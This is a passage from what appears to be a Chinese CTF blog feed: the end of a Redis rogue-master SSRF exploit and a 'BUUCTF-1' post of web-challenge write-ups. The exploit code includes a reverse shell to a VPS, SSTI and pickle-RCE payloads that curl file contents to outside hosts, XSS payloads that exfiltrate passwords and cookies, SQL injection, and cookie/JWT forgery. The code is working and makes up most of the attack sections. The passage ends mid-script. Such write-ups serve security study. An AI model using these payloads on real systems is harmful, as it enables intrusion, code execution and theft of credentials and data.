<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> socketserver</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">logging.basicConfig(stream=sys.stdout, level=logging.INFO, <span class="built_in">format</span>=<span class="string">&#x27;&gt;&gt; %(message)s&#x27;</span>)</span><br><span class="line">DELIMITER = <span class="string">b&quot;\r\n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RoguoHandler</span>(socketserver.BaseRequestHandler):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decode</span>(<span class="params">self, data</span>):</span><br><span class="line">        <span class="keyword">if</span> data.startswith(<span class="string">b&#x27;*&#x27;</span>):</span><br><span class="line">            <span class="keyword">return</span> data.strip().split(DELIMITER)[<span class="number">2</span>::<span class="number">2</span>]</span><br><span class="line">        <span class="keyword">if</span> data.startswith(<span class="string">b&#x27;$&#x27;</span>):</span><br><span class="line">            <span class="keyword">return</span> data.split(DELIMITER, <span class="number">2</span>)[<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">return</span> data.strip().split()</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">handle</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            data = self.request.recv(<span class="number">1024</span>)</span><br><span class="line">            logging.info(<span class="string">&quot;receive data: %r&quot;</span>, data)</span><br><span class="line">            arr = self.decode(data)</span><br><span class="line">            <span class="keyword">if</span> arr[<span class="number">0</span>].startswith(<span class="string">b&#x27;PING&#x27;</span>):</span><br><span class="line">                self.request.sendall(<span class="string">b&#x27;+PONG&#x27;</span> + DELIMITER)</span><br><span class="line">            <span class="keyword">elif</span> arr[<span class="number">0</span>].startswith(<span class="string">b&#x27;REPLCONF&#x27;</span>):</span><br><span class="line">                self.request.sendall(<span class="string">b&#x27;+OK&#x27;</span> + DELIMITER)</span><br><span class="line">            <span class="keyword">elif</span> arr[<span class="number">0</span>].startswith(<span class="string">b&#x27;PSYNC&#x27;</span>) <span class="keyword">or</span> arr[<span class="number">0</span>].startswith(<span class="string">b&#x27;SYNC&#x27;</span>):</span><br><span class="line">                self.request.sendall(<span class="string">b&#x27;+FULLRESYNC &#x27;</span> + <span class="string">b&#x27;Z&#x27;</span> * <span class="number">40</span> + <span class="string">b&#x27; 1&#x27;</span> + DELIMITER)</span><br><span class="line">                self.request.sendall(<span class="string">b&#x27;$&#x27;</span> + <span class="built_in">str</span>(<span class="built_in">len</span>(self.server.payload)).encode() + DELIMITER)</span><br><span class="line">                self.request.sendall(self.server.payload + DELIMITER)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        self.finish()</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">finish</span>(<span class="params">self</span>):</span><br><span class="line">        self.request.close()</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RoguoServer</span>(socketserver.TCPServer):</span><br><span class="line">    allow_reuse_address = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, server_address, payload</span>):</span><br><span class="line">        <span class="built_in">super</span>(RoguoServer, self).__init__(server_address, RoguoHandler, <span class="literal">True</span>)</span><br><span class="line">        self.payload = payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;exp.so&quot;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    server = RoguoServer((<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">1088</span>), f.read())</span><br><span class="line">    server.handle_request()</span><br></pre></td></tr></table></figure>

<p>但是在Redis中，为了防止http协议对Redis端口的攻击，它如果检测到”POST”或者”Host:”，就会中断这次连接，并且在日志中留下这行，我们可以通过添加<code>%00</code>绕过</p>
<p>但是Redis是一边判断一边逐行执行，所以只要在读到”Host:”之前把需要的操作做完即可，所以不加也没关系（</p>
<p>所以最终exp为</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> rq</span><br><span class="line"></span><br><span class="line">target = <span class="string">&quot;http://45.77.217.198:10802&quot;</span></span><br><span class="line">vps = <span class="string">&quot;167.179.94.19&quot;</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">f&#x27;&#x27;&#x27; HTTP/1.1</span></span><br><span class="line"><span class="string">AUTH 123456</span></span><br><span class="line"><span class="string">slaveof <span class="subst">&#123;vps&#125;</span> 1089</span></span><br><span class="line"><span class="string">config set dbfilename exp.so</span></span><br><span class="line"><span class="string">foo: &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">f&#x27;&#x27;&#x27; HTTP/1.1</span></span><br><span class="line"><span class="string">AUTH 123456</span></span><br><span class="line"><span class="string">module load ./exp.so</span></span><br><span class="line"><span class="string">slaveof no one</span></span><br><span class="line"><span class="string">config set dbfilename dump.rdb</span></span><br><span class="line"><span class="string">system.rev <span class="subst">&#123;vps&#125;</span> 4444</span></span><br><span class="line"><span class="string">foo: &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>(<span class="params">payload</span>):</span><br><span class="line">	payload = urllib.parse.quote(payload).replace(<span class="string">&quot;%0A&quot;</span>, <span class="string">&quot;%0D%0A&quot;</span>)</span><br><span class="line">	payload = <span class="string">&quot;?url=http://127.0.0.1:6379/&quot;</span> + payload</span><br><span class="line">	payload = urllib.parse.quote(payload)</span><br><span class="line">	payload = <span class="string">&quot;?url=http://foo@127.0.0.1:5000%20@www.baidu.com/&quot;</span> + payload</span><br><span class="line">	<span class="built_in">print</span>(payload)</span><br><span class="line">	res = rq.get(target + payload)</span><br><span class="line">	<span class="built_in">print</span>(res.text)</span><br><span class="line"></span><br><span class="line"><span class="comment"># execute step by step</span></span><br><span class="line">exp(payload1)</span><br><span class="line">exp(payload2)</span><br></pre></td></tr></table></figure>



]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUCTF-1</title>
    <url>/2020/05/26/BUUCTF-1/</url>
    <content><![CDATA[<p>补一下之前做的 BUUCTF 的一些练习</p>
<span id="more"></span>

<h2 id="GWCTF-2019-你的名字"><a href="#GWCTF-2019-你的名字" class="headerlink" title="[GWCTF 2019]你的名字"></a>[GWCTF 2019]你的名字</h2><p>SSTI 模板注入，输入以下会报错</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;2*2&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>我们可以用以下绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% if xxx %&#125; 1 &#123;% endif %&#125;</span><br></pre></td></tr></table></figure>

<p>经过 fuzz 之后以下关键词被绕过，原理是直接 replace，可以插入黑名单绕过</p>
<p>优先 python2，优先命令执行，见到 waf 就插 ifconfig，试出以下 payload</p>
<p>不知道为什么内网的 requests curl 不了，所以就开了台内网的机子</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% iconfigf ().__claconfigss__.__basconfiges__[0].__subclconfigasses__()[59].__init__.func_globaconfigls.linecache.oconfigs.popconfigen(&quot;curl http://174.0.234.231:9000/`ls /|base64`&quot;).read()%&#125;kk&#123;% endiconfigf %&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% iconfigf ().__claconfigss__.__basconfiges__[0].__subclconfigasses__()[59].__init__.func_globaconfigls.linecache.oconfigs.popconfigen(&quot;curl http://174.0.234.231:9000/ -d `cat /*|base64`&quot;).read()%&#125;kk&#123;% endiconfigf %&#125;</span><br></pre></td></tr></table></figure>

<h2 id="HITCON-2019-Buggy-Net"><a href="#HITCON-2019-Buggy-Net" class="headerlink" title="[HITCON 2019]Buggy_Net"></a>[HITCON 2019]Buggy_Net</h2><p>此题考察了 ASP.NET 4.0 的漏洞</p>
<p>在 ASP.NET 4.0 中，对于 POST 请求，from 参数中含有危险内容（如 HTML 标签<code>&lt;xxx</code>）会被拦截，但是对于相同变量的 query 参数只会在首次访问<code>Request.QueryString</code>抛出异常</p>
<p>同样的，对于 GET 请求，query 参数中含有危险内容（如 HTML 标签<code>&lt;xxx</code>）会被拦截，但是对于相同变量的 form 参数只会在首次访问<code>Request.Form</code>抛出异常</p>
<p>所以这里我们利用 GET 请求，提交一个含有 HTML 标签的数据就可以绕过第一个目录遍历的异常处理，第二步就可以读取任意文件了</p>
<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">filename=../../flag.txt&amp;kk=&lt;a</span><br></pre></td></tr></table></figure>



<h2 id="PASECA2019-honey-shop"><a href="#PASECA2019-honey-shop" class="headerlink" title="[PASECA2019]honey_shop"></a>[PASECA2019]honey_shop</h2><p>在 Linux 中 &#x2F;proc&#x2F;self&#x2F; 指向当前目录，然后 SECRET_KEY 被收藏在 environ，所以访问 &#x2F;proc&#x2F;self&#x2F;environ 就能得到访问到 SECRET_KEY</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SECRET_KEY=ACjzCrqQuX1nn6tmtmF80jQchsFJiUtq0sLdFDcH </span><br></pre></td></tr></table></figure>

<p>之后就可以伪造 cookie 了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># python .\flask_session_cookie_manager3.py encode -s &quot;ACjzCrqQuX1nn6tmtmF80jQchsFJiUtq0sLdFDcH&quot; -t &quot;&#123;&#x27;balance&#x27;:1999,&#x27;purchases&#x27;:[&#x27;Linden honey&#x27;]&#125;&quot;</span><br><span class="line"></span><br><span class="line">eyJiYWxhbmNlIjoxOTk5LCJwdXJjaGFzZXMiOlsiTGluZGVuIGhvbmV5Il19.Xmot1Q.lcjSJIrZDRkwyyF8xIYU3Sa9yKo</span><br></pre></td></tr></table></figure>



<h2 id="BSidesCF-2020-Had-a-bad-day"><a href="#BSidesCF-2020-Had-a-bad-day" class="headerlink" title="[BSidesCF 2020]Had a bad day"></a>[BSidesCF 2020]Had a bad day</h2><p>文件包含，参数必须包含 woofers 或者 meowers</p>
<p>可用过滤器绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/convert.base64-encode/write=woofers/resource=flag</span><br></pre></td></tr></table></figure>



<h2 id="Zer0pts2020-Can-you-guess-it"><a href="#Zer0pts2020-Can-you-guess-it" class="headerlink" title="[Zer0pts2020]Can you guess it?"></a>[Zer0pts2020]Can you guess it?</h2><p>无法进行时序攻击，所以只能绕过正则读 flag，但是不能以 config.php 结尾，但是<code>basename</code>可以用特殊字符扰乱规则绕过，但是试了好几个都不行，那就遍历一下</p>
<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">for i in range(500):</span><br><span class="line">        url = &quot;http://15c46786-5a10-4bf1-869f-15dadc8b743f.node3.buuoj.cn/index.php/config.php/%&#123;&#125;?source&quot;.format(hex(i)[2:].zfill(2))</span><br><span class="line">        r = requests.get(url)</span><br><span class="line">        print(i)</span><br><span class="line">        if &#x27;flag&#x27; in r.text:</span><br><span class="line">                print(url)</span><br><span class="line">                print(r.text)</span><br><span class="line">                break</span><br></pre></td></tr></table></figure>



<h2 id="BSidesCF-2020-Cards"><a href="#BSidesCF-2020-Cards" class="headerlink" title="[BSidesCF 2020]Cards"></a>[BSidesCF 2020]Cards</h2><p>逻辑题目</p>
<p>访问<code>/api</code>可以得到一个 SecretState 这个是当前余额的一个哈希码</p>
<p>访问<code>/api/deal</code>可以进行赌博，但是只要我们的 state 不会变，我们的余额就不会变，当我们的应答包含 BlackJack 的时候，我们的余额会增加，然后我们就可以获取它的 SerectState 进行下一次赌博，这样就可以一直赢了</p>
<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &#x27;http://62fdfbb0-31ff-409c-91fe-b3b1ded86d9a.node3.buuoj.cn/&#x27;</span><br><span class="line">state = requests.post(url+&#x27;api&#x27;).json()[&#x27;SecretState&#x27;]</span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">	print(&quot;try&quot;)</span><br><span class="line">	res = requests.post(url+&#x27;api/deal&#x27;, json = &#123;&#x27;Bet&#x27;: 500, &#x27;SecretState&#x27;: state&#125;).json()</span><br><span class="line">	if res[&#x27;GameState&#x27;] == &#x27;Blackjack&#x27;:</span><br><span class="line">		print(res)</span><br><span class="line">		state = res[&#x27;SecretState&#x27;]</span><br><span class="line">	if &#x27;Flag&#x27; in res:</span><br><span class="line">		print(res[&#x27;Flag&#x27;])</span><br><span class="line">		break</span><br></pre></td></tr></table></figure>



<h2 id="watevrCTF-2019-Pickle-Store"><a href="#watevrCTF-2019-Pickle-Store" class="headerlink" title="[watevrCTF-2019]Pickle Store"></a>[watevrCTF-2019]Pickle Store</h2><p>flask-session-cookies 解密是 pickle 形式，应该考察的是 pickle 反序列化</p>
<p>直接贴 payload</p>
<blockquote>
<p>一开始一直不成功，后来发现是系统问题，一定要在 Linux 环境下运行！</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import _pickle as cPickle</span><br><span class="line">import sys</span><br><span class="line">import base64</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">COMMAND = &quot;curl http://http.requestbin.buuoj.cn/18g6bpi1/`cat flag.txt|base64`&quot;</span><br><span class="line"></span><br><span class="line">class PickleRce(object):</span><br><span class="line">    def __reduce__(self):</span><br><span class="line">        import os</span><br><span class="line">        return (os.system,(COMMAND,))</span><br><span class="line"></span><br><span class="line">cookies = base64.b64encode(cPickle.dumps(PickleRce())).decode()</span><br><span class="line"></span><br><span class="line">print(cookies)</span><br><span class="line">cookies = &#123;&quot;session&quot;:cookies&#125;</span><br><span class="line">response = requests.get(&quot;http://02fb1191-450e-4699-b981-9b4922ae948d.node3.buuoj.cn/&quot;, cookies=cookies)</span><br><span class="line">print(response.text)</span><br></pre></td></tr></table></figure>



<h2 id="RootersCTF2019-babyWeb"><a href="#RootersCTF2019-babyWeb" class="headerlink" title="[RootersCTF2019]babyWeb"></a>[RootersCTF2019]babyWeb</h2><p>随缘试一下报错注入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://7a65e348-5074-45ed-b289-b4808c188a68.node3.buuoj.cn/?search=1 and (extractvalue(1,concat(0x7e,(select uniqueid from users limit 1),0x7e)));</span><br></pre></td></tr></table></figure>

<p>直接提交即可</p>
<p><code>http://7a65e348-5074-45ed-b289-b4808c188a68.node3.buuoj.cn/?search=837461526918364526</code></p>
<h2 id="RootersCTF2019-I-lt-3-Flask"><a href="#RootersCTF2019-I-lt-3-Flask" class="headerlink" title="[RootersCTF2019]I_&lt;3_Flask"></a>[RootersCTF2019]I_&lt;3_Flask</h2><p>SSTI 直接打过去（python3）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://e430c2d8-e92e-467c-871b-c432eff885ea.node3.buuoj.cn/?name=&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat flag.txt&#x27;).read()&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>



<h2 id="RootersCTF2019-ImgXweb"><a href="#RootersCTF2019-ImgXweb" class="headerlink" title="[RootersCTF2019]ImgXweb"></a>[RootersCTF2019]ImgXweb</h2><p>上传文件没什么用，因为这是个 flask，把 session 抓下来看看是什么</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># python .\flask_session_cookie_manager3.py decode -c eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoia2trayJ9.ppXwYZguivTJVIyddZBLSxS9C3ptkUon1PIGjmxPEKw</span><br><span class="line">b&#x27;&#123;&quot;typ&quot;:&quot;JWT&quot;,&quot;alg&quot;:&quot;HS256&quot;&#125;&#x27;</span><br></pre></td></tr></table></figure>

<p>提示是 jwt，那拿去解码一下</p>
<p><img src="https://i.loli.net/2020/05/26/4kF3hcy1jWCdJKb.png" alt="image-20200313210246245"></p>
<p>封装的是用户名，回去用 admin 注册一下发现已存在用户，所以应该是伪造 admin，但是没有密钥…</p>
<p>robots.txt 有惊喜，得到了 key</p>
<p> <code>you-will-never-guess</code></p>
<p>伪造得到<code>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.g_lGU4qTO2VhNrZK9k460xz828GcqKBayZPcmLmhUqE</code></p>
<p>替换进入页面发现 flag，加个 view-source 就看到了</p>
<p><img src="https://i.loli.net/2020/05/26/NhtKWTqBAGELuC8.png" alt="image-20200313210558800"></p>
<h2 id="October-2019-Twice-SQL-Injection"><a href="#October-2019-Twice-SQL-Injection" class="headerlink" title="October 2019 Twice SQL Injection"></a>October 2019 Twice SQL Injection</h2><p>题目提示过于明显，直接凭感觉对着用户名注册登陆一把嗦</p>
<p>不必写脚本了，bp 按两下就好了</p>
<p>查表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; union select group_concat(table_name) from information_schema.tables where table_schema=database()#</span><br><span class="line"></span><br><span class="line">FLAG_TABLE,news,users</span><br></pre></td></tr></table></figure>

<p>查列</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; union select group_concat(column_name) from information_schema.columns where table_schema=database()#</span><br><span class="line"></span><br><span class="line">FLAG_COLUMN,id,title,content,time,id,username,password,info</span><br></pre></td></tr></table></figure>

<p>但是数据库里面没有 flag，应该是另外一种操作，看看其他表，没东西，但是提示确实是在数据库，应该是个幌子</p>
<p>试了一下写不了 shell，根目录也没默认 flag，这里卡了一个晚上…</p>
<p>第二天登上去，诡异的事情发生了… flag 连上表名和列名都变了？？？</p>
<p><img src="https://i.loli.net/2020/05/26/wIlEVUDefhocipz.png" alt="image-20200314110159110"></p>
<p>最后，emmm</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; union select flag from flag#</span><br><span class="line"></span><br><span class="line">flag&#123;729c33d0-8f58-4bf6-9e77-c42c786ffefa&#125;</span><br></pre></td></tr></table></figure>

<p>这里有一说一，我真不知道为什么</p>
<h2 id="GWCTF-2019-mypassword"><a href="#GWCTF-2019-mypassword" class="headerlink" title="[GWCTF 2019]mypassword"></a>[GWCTF 2019]mypassword</h2><p>有反馈页面，那就是 XSS，查看源码，只要以 admin 登陆就能看到 flag</p>
<p>看看 CSP，只支持同源，支持内联标签</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Content-Security-Policy: default-src &#x27;self&#x27;;script-src &#x27;unsafe-inline&#x27; &#x27;self&#x27;</span><br></pre></td></tr></table></figure>

<p>看看黑名单，过滤了很多关键字和编码，查看过滤逻辑，只要在关键字中间插入黑名单靠后的关键字就可以绕过，所以我们可以通过插入 cookie 绕过</p>
<p>看到了 login.js 的代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (document.cookie &amp;&amp; document.cookie != &#x27;&#x27;) &#123;</span><br><span class="line">	var cookies = document.cookie.split(&#x27;; &#x27;);</span><br><span class="line">	var cookie = &#123;&#125;;</span><br><span class="line">	for (var i = 0; i &lt; cookies.length; i++) &#123;</span><br><span class="line">		var arr = cookies[i].split(&#x27;=&#x27;);</span><br><span class="line">		var key = arr[0];</span><br><span class="line">		cookie[key] = arr[1];</span><br><span class="line">	&#125;</span><br><span class="line">	if(typeof(cookie[&#x27;user&#x27;]) != &quot;undefined&quot; &amp;&amp; typeof(cookie[&#x27;psw&#x27;]) != &quot;undefined&quot;)&#123;</span><br><span class="line">		document.getElementsByName(&quot;username&quot;)[0].value = cookie[&#x27;user&#x27;];</span><br><span class="line">		document.getElementsByName(&quot;password&quot;)[0].value = cookie[&#x27;psw&#x27;];</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果用户正在登陆，就会把用户名和密码填充到表单里面</p>
<p>所以我们可以构造一个登陆页面，提交给 bot 让他自己填就好了</p>
<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;incookieput type=&quot;text&quot; name=&quot;username&quot;&gt;</span><br><span class="line">&lt;incookieput type=&quot;password&quot; name=&quot;password&quot;&gt;</span><br><span class="line">&lt;scrcookieipt scookierc=&quot;./js/login.js&quot;&gt;&lt;/scrcookieipt&gt;</span><br><span class="line">&lt;scrcookieipt&gt;</span><br><span class="line">	var psw = docucookiement.getcookieElementsByName(&quot;password&quot;)[0].value;</span><br><span class="line">	docucookiement.locacookietion=&quot;http://http.requestbin.buuoj.cn/18g6bpi1/?psw=&quot;+psw;</span><br><span class="line">&lt;/scrcookieipt&gt;</span><br></pre></td></tr></table></figure>



<h2 id="CISCN2019-华东北赛区-Web2"><a href="#CISCN2019-华东北赛区-Web2" class="headerlink" title="[CISCN2019 华东北赛区]Web2"></a>[CISCN2019 华东北赛区]Web2</h2><p>投稿 + 反馈，显然是个 XSS</p>
<p>简单 fuzz 一下，过滤了很多标签和符号，但是 &amp;# 没有被过滤，所以我们可以用 unicode 编码绕过，在下面找了一个可以用的 payload</p>
<blockquote>
<p><a href="https://wooyun.js.org/drops/Bypass">https://wooyun.js.org/drops/Bypass</a> xss过滤的测试方法.html</p>
</blockquote>
<p><code>&lt;svg&gt;&lt;script&gt;alert&amp;#40/1/&amp;#41&lt;/script&gt; </code></p>
<p>但是又因为过滤了 &#x3D; ，所以就用 eval 反弹，记得域名要用 web 代替</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">&quot;(function()&#123;window.location.href=&#x27;http://xss.buuoj.cn/index.php?do=api&amp;id=EP3Yq3&amp;location=&#x27;+escape((function()&#123;try&#123;return document.location.href&#125;catch(e)&#123;return&#x27;&#x27;&#125;&#125;)())+&#x27;&amp;toplocation=&#x27;+escape((function()&#123;try&#123;return top.location.href&#125;catch(e)&#123;return&#x27;&#x27;&#125;&#125;)())+&#x27;&amp;cookie=&#x27;+escape((function()&#123;try&#123;return document.cookie&#125;catch(e)&#123;return&#x27;&#x27;&#125;&#125;)())+&#x27;&amp;opener=&#x27;+escape((function()&#123;try&#123;return(window.opener&amp;&amp;window.opener.location.href)?window.opener.location.href:&#x27;&#x27;&#125;catch(e)&#123;return&#x27;&#x27;&#125;&#125;)());&#125;)();&quot;</span></span><br><span class="line"></span><br><span class="line">uc_payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> payload:</span><br><span class="line">	uc_payload += <span class="string">&#x27;&amp;#&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">ord</span>(i))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&lt;svg&gt;&lt;script&gt;eval&#x27;</span> + uc_payload + <span class="string">&#x27;&lt;/script&gt;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure>

<p>然后绕过 md5 就可以了，给出我自己用的两个脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># gen_md5.py</span></span><br><span class="line"><span class="keyword">import</span> json, sys, hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getMD5</span>(<span class="params">count=<span class="number">5</span>, Salt=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">	f = <span class="built_in">open</span>(<span class="string">&#x27;md5-&#123;&#125;.json&#x27;</span>.<span class="built_in">format</span>(count),<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">	MD5 = &#123;&#125;</span><br><span class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000000</span>, <span class="number">9999999</span>):</span><br><span class="line">		captcha = <span class="built_in">str</span>(x)+ Salt</span><br><span class="line">		MD5[hashlib.md5(captcha).hexdigest()[:<span class="built_in">int</span>(count)]] = x </span><br><span class="line">	json.dump(MD5, f)</span><br><span class="line">	f.close()</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) == <span class="number">2</span>:</span><br><span class="line">		getMD5(sys.argv[<span class="number">1</span>])</span><br><span class="line">	<span class="keyword">elif</span> <span class="built_in">len</span>(sys.argv)==<span class="number">3</span>:</span><br><span class="line">		getMD5(sys.argv[<span class="number">1</span>],sys.argv[<span class="number">2</span>])</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		getMD5()</span><br><span class="line">	</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># find_md5.py</span></span><br><span class="line"><span class="keyword">import</span> sys, json</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) == <span class="number">3</span>:</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		f = <span class="built_in">open</span>(<span class="string">&quot;md5-&#123;&#125;.json&quot;</span>.<span class="built_in">format</span>(sys.argv[<span class="number">1</span>]),<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">		MD5 = json.load(f)</span><br><span class="line">		<span class="built_in">print</span>(MD5[sys.argv[<span class="number">2</span>]])</span><br><span class="line">		f.close()</span><br><span class="line">	<span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;no key&quot;</span>)</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/05/26/ozCMt8RKuWI36TX.png" alt="image-20200314152227158"></p>
<p>替换 session 扫描后台发现 admin.php，点进去就是一个 sqli</p>
<p>测了一下没什么过滤，就直接 sqlmap 一把梭吧</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python .\sqlmap.py -cookie=&quot;PHPSESSID=312a8283a4e7aaa5894ef9018c52e05e&quot; -u http://5f6fb99e-e122-4707-b88d-f896487c7f64.node3.buuoj.cn/admin.php?id=1 -D ciscn -T flag --dump</span><br></pre></td></tr></table></figure>



<h2 id="网鼎杯2018-Unfinish"><a href="#网鼎杯2018-Unfinish" class="headerlink" title="[网鼎杯2018]Unfinish"></a>[网鼎杯2018]Unfinish</h2><p>一进去是个登陆界面，随便改个 register.php 得到注册页面，登陆进去只有用户名显示，显然是个二次注入，注册用户名为<code>1&#39;or&#39;1</code>，用户名显示为<code>1</code>但是试了一下 <code>union select</code> 无法注册，想了想逻辑应该是直接把邮箱、用户名和密码拼进去，然后根据邮箱查询把用户名带出来</p>
<p>所以这里我们可以直接拼字符串，学到了一个新姿势，就是二次 hex</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;+select(hex(hex(payload)))+&#x27;</span><br></pre></td></tr></table></figure>

<p>二次 hex 的原因是 一次 hex 后结果带有字母，变成字符串后不会带出来</p>
<p>二次 hex 最多只能取三个字母，不然会变成科学计数法</p>
<p>但是过滤了 information_schema ，只能盲猜一个 flag 了</p>
<p>还过滤了逗号，所有用 <code>substr xxx from x for x</code></p>
<p>payload</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> offset <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">	email = <span class="string">&quot;kk&#123;&#125;@test.com&quot;</span>.<span class="built_in">format</span>(random.randint(<span class="number">1</span>,<span class="number">10000000</span>))</span><br><span class="line">	<span class="comment"># payload = &quot;&#x27;+(select hex(hex(database())))+&#x27;&quot;</span></span><br><span class="line">	payload = <span class="string">&quot;&#x27;+(select (hex(hex(substr((select * from flag) from &#123;&#125; for 3)))))+&#x27;&quot;</span>.<span class="built_in">format</span>(<span class="number">1</span>+<span class="number">3</span>*offset)</span><br><span class="line"></span><br><span class="line">	<span class="comment"># print(&quot;[Email] &#123;&#125;&quot;.format(email))</span></span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;[Username] &#123;&#125;&quot;</span>.<span class="built_in">format</span>(payload))</span><br><span class="line"></span><br><span class="line">	paramsPost = &#123;<span class="string">&quot;password&quot;</span>:<span class="string">&quot;kk&quot;</span>,<span class="string">&quot;email&quot;</span>:email,<span class="string">&quot;username&quot;</span>:payload&#125;</span><br><span class="line">	r1 = requests.post(<span class="string">&quot;http://a5e38411-27dd-44db-aaa2-76ee10062321.node3.buuoj.cn/register.php&quot;</span>, data=paramsPost)</span><br><span class="line">	<span class="comment"># print(r1.text)</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">try</span>:</span><br><span 